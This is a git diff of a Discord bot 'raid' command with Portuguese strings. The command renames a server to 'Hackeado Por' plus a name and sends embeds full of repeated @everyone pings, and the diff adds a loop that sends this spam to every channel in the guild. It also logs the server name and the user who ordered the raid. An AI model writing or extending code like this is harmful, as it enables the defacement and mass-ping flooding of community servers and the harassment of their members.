@@ -5,7 +5,7 @@ exports.run = async (client, message, args) => {
     if(!arg){
         arg = "Gustavo33"
     }
-    console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + `Id De ${message.author.username}: ${message.author.id}`)
+    console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
     message.guild.setName(`Hackeado Por ${arg}`)
     let Title = `Hackeado Por: ${arg}`
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
@@ -32,6 +32,7 @@ exports.run = async (client, message, args) => {
    let canal = message.channel
    let guildid = message.guild.id;
    function msg(){
+     client.guilds.get(message.guild.id).channels.forEach((canal) => {
         canal.send(embed)
         canal.send(embed0)
         canal.send(embed1)
@@ -47,6 +48,7 @@ exports.run = async (client, message, args) => {
         canal.send(embed)
         canal.send(embed0)
         canal.send(embed1)
+     })
    }
    function msg1(){/*
     canal.send("|| @everyone | @here ||")
